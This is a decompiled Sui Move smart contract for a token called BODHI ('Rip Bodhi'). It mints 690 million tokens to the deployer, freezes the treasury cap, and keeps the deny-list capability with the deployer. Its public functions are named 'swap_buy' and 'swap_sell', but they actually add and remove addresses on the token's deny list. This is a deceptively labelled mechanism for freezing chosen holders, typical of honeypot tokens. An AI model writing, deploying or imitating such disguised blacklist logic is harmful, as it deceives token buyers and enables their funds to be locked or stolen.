module 0xb0367bacefed527cb8c1c6beefaa942b188e64326534826bdc939e2c85756171::bodhi {
    struct BODHI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BODHI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BODHI>(arg0, 9, b"BODHI", b"Rip Bodhi", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmbK8Vnxz2CdKmNdkDKYvC2PHiJyBs9fVJsvWsr1qShVoZ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BODHI>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BODHI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BODHI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BODHI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BODHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BODHI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BODHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BODHI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

